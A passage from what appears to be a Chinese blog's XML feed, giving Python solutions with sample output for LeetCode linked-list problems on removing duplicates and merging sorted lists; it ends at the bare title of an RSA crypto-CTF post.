class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> current.next.val==current.val:</span><br><span class="line">                current.next=current.next.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                current=current.next</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.deleteDuplicates(new_a)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 4]</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用了两个指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (head <span class="keyword">and</span> head.next):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        a = head</span><br><span class="line">        b = head.next</span><br><span class="line">        <span class="keyword">while</span> b:</span><br><span class="line">            <span class="keyword">if</span> a.val!=b.val:</span><br><span class="line">                a=b</span><br><span class="line">                b=b.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> b <span class="keyword">and</span> a.val==b.val:</span><br><span class="line">                    b = b.next</span><br><span class="line"></span><br><span class="line">                a.next = b</span><br><span class="line">                a=b</span><br><span class="line">                b = b.next <span class="keyword">if</span> b <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.deleteDuplicates(new_a)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 4]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】82. 删除排序链表中的重复元素 II</title>
      <link href="2020/11/13/LeetCode-A-%E9%93%BE%E8%A1%A8-82.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0%20II/"/>
      <url>2020/11/13/LeetCode-A-%E9%93%BE%E8%A1%A8-82.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0%20II/</url>
      
        <content type="html"><![CDATA[<p>将有序链表中重复出现的元素删除。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。</p><pre><code> 示例 1: 输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 输出: 1-&gt;2-&gt;5示例 2:输入: 1-&gt;1-&gt;1-&gt;2-&gt;3输出: 2-&gt;3</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>比较笨的方法：利用哈希表记录每个值得频率</p><ul><li>遍历链表，将每个节点的值放到哈希表中，哈希表的key就是节点的值，value是这个值出现的频率</li><li>遍历哈希表，将所有频率==1的key放到集合中</li><li>对集合进行排序</li><li>遍历集合，然后不断创建新的链表节点</li></ul><p>当然这里可以优化一下，比如使用LinkedHashMap或者OrderedDict这样的数据结构，可以省去排序环节。</p><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (head <span class="keyword">and</span> head.next):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        <span class="comment"># 用哈希表记录每个节点值的出现频率</span></span><br><span class="line">        d = dict()</span><br><span class="line">        p = head</span><br><span class="line">        arr = []</span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            val = p.val</span><br><span class="line">            d[val] = d.setdefault(val,<span class="number">0</span>)+<span class="number">1</span></span><br><span class="line">            p = p.next</span><br><span class="line">        <span class="comment"># 将所有只出现一次的值放到arr中，之后再对这个arr排序</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">if</span> d[k]==<span class="number">1</span>:</span><br><span class="line">                arr.append(k)</span><br><span class="line">        arr = sorted(arr)</span><br><span class="line">        dummy = ListNode(<span class="number">-1</span>)</span><br><span class="line">        p = dummy</span><br><span class="line">        <span class="comment"># 创建长度为len(arr)长度的链表，依次将arr中的值赋给每个链表节点</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">            tmp = ListNode(i)</span><br><span class="line">            p.next = tmp</span><br><span class="line">            p = p.next</span><br><span class="line">        <span class="keyword">return</span> dummy.next</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.deleteDuplicates(new_a)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[-1, 2, 4]</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre><code>双指针的方式，定义a，b两个指针。考虑到一些边界条件，比如1-&gt;1-&gt;1-&gt;2这种情况，需要把开头的几个1给去掉，我们增加一个哑结点，方便边界处理。初始的两个指针如下:将a指针指向哑结点将b指针指向head(哑结点的下一个节点)如果a指向的值不等于b指向的值，则两个指针都前进一位否则，就单独移动b，b不断往前走，直到a指向的值不等于b指向的值。注意，这里不是直接比较a.val==b.val，这么比较不对，因为初始的时候，a指向的是哑结点，所以比较逻辑应该是这样：a.next.val == b.next.val当两个指针指向的值相等时，b不断往前移动，这里是通过一个while循环判断的，因为要过滤掉1-&gt;2-&gt;2-&gt;2-&gt;3重复的2。那么整个逻辑就是两个while，但时间复杂度不是O(N^2)，而是O(N)，空间上也只是常数级别。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (head <span class="keyword">and</span> head.next):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        dummy = ListNode(<span class="number">-1</span>)</span><br><span class="line">        dummy.next = head</span><br><span class="line">        a = dummy</span><br><span class="line">        b = head</span><br><span class="line">        <span class="keyword">while</span> b <span class="keyword">and</span> b.next:</span><br><span class="line">            <span class="comment"># 初始化的时a指向的是哑结点，所以比较逻辑应该是a的下一个节点和b的下一个节点</span></span><br><span class="line">            <span class="keyword">if</span> a.next.val!=b.next.val:</span><br><span class="line">                a = a.next</span><br><span class="line">                b = b.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果a、b指向的节点值相等，就不断移动b，直到a、b指向的值不相等 </span></span><br><span class="line">                <span class="keyword">while</span> b <span class="keyword">and</span> b.next <span class="keyword">and</span> a.next.val==b.next.val:</span><br><span class="line">                    b = b.next</span><br><span class="line">                a.next = b.next</span><br><span class="line">                b = b.next</span><br><span class="line">        <span class="keyword">return</span> dummy.next</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.deleteDuplicates(new_a)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[-1, 2, 4]</code></pre><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3:"></a>方法3:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (head <span class="keyword">and</span> head.next):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        dummy = ListNode(<span class="number">-1</span>)</span><br><span class="line">        dummy.next = head</span><br><span class="line">        a = dummy</span><br><span class="line">        b = head.next</span><br><span class="line">        <span class="keyword">while</span> b:</span><br><span class="line">            <span class="keyword">if</span> a.next.val!=b.val:</span><br><span class="line">                a = a.next</span><br><span class="line">                b = b.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> b <span class="keyword">and</span> a.next.val==b.val:</span><br><span class="line">                    b = b.next</span><br><span class="line">                <span class="comment"># 这里的去重跟解法二有点差别，解法二的是</span></span><br><span class="line">                <span class="comment"># a.next = b.next</span></span><br><span class="line">                a.next = b</span><br><span class="line">                <span class="comment"># b指针在while中判断完后，可能指向了null，这里需要处理边界问题</span></span><br><span class="line">                b = b.next <span class="keyword">if</span> b <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> dummy.next</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(a)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.deleteDuplicates(new_a)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[-1, 2, 4]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】21.合并两个有序链表</title>
      <link href="2020/11/12/LeetCode-A-%E9%93%BE%E8%A1%A8-21.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/12/LeetCode-A-%E9%93%BE%E8%A1%A8-21.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>LeetCode，合并两个有序链表</p><a id="more"></a><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><ul><li><p>示例：</p><p>  输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4<br>  输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, next=None)</span>:</span></span><br><span class="line">        self.val = val</span><br><span class="line">        self.next = next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">elif</span> l2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l1</span><br><span class="line">        <span class="keyword">elif</span> l1.val &lt; l2.val:</span><br><span class="line">            l1.next = self.mergeTwoLists(l1.next, l2)</span><br><span class="line">            <span class="keyword">return</span> l1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l2.next = self.mergeTwoLists(l1, l2.next)</span><br><span class="line">            <span class="keyword">return</span> l2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">1</span>)</span><br><span class="line">    rear =head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(lista)):</span><br><span class="line">        new = ListNode(lista[i])</span><br><span class="line">        rear.next=new</span><br><span class="line">        rear = new</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    b=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    l1=createLink(a)</span><br><span class="line">    l2=createLink(b)</span><br><span class="line">    <span class="comment">#l1=ListNode(1,ListNode(2,ListNode(4)))</span></span><br><span class="line">    <span class="comment">#l2=ListNode(1,ListNode(3,ListNode(4)))</span></span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.mergeTwoLists(l1,l2)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 1, 2, 3, 4, 4]</code></pre><h4 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, next=None)</span>:</span></span><br><span class="line">        self.val = val</span><br><span class="line">        self.next = next</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        prehead = ListNode(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">        prev = prehead</span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            <span class="keyword">if</span> l1.val &lt;= l2.val:</span><br><span class="line">                prev.next = l1</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev.next = l2</span><br><span class="line">                l2 = l2.next            </span><br><span class="line">            prev = prev.next</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并后 l1 和 l2 最多只有一个还未被合并完，我们直接将链表末尾指向未合并完的链表即可</span></span><br><span class="line">        prev.next = l1 <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> l2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prehead.next</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">1</span>)</span><br><span class="line">    rear =head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(lista)):</span><br><span class="line">        new = ListNode(lista[i])</span><br><span class="line">        rear.next=new</span><br><span class="line">        rear = new</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    b=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    l1=createLink(a)</span><br><span class="line">    l2=createLink(b)</span><br><span class="line">    <span class="comment">#l1=ListNode(1,ListNode(2,ListNode(4)))</span></span><br><span class="line">    <span class="comment">#l2=ListNode(1,ListNode(3,ListNode(4)))</span></span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.mergeTwoLists(l1,l2)</span><br><span class="line">    list1=[]</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">None</span>):</span><br><span class="line">        list1.append(p.val)</span><br><span class="line">        <span class="comment">#print(p.val)</span></span><br><span class="line">        p=p.next</span><br><span class="line">    print(list1)</span><br></pre></td></tr></table></figure><pre><code>[1, 1, 2, 3, 4, 4]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Crypto-CTF】RSA常用工具及python库说明</title>
      <link href="2020/10/30/Crypto-01-RSA%E5%B7%A5%E5%85%B7%E5%92%8C%E5%B8%B8%E7%94%A8python%E5%BA%93%E8%AF%B4%E6%98%8E/"/>
      <url>2020/10/30/Crypto-01-RSA%E5%B7%A5%E5%85%B7%E5%92%8C%E5%B8%B8%E7%94%A8python%E5%BA%93%E8%AF%B4%E6%98%8E/</url>
      
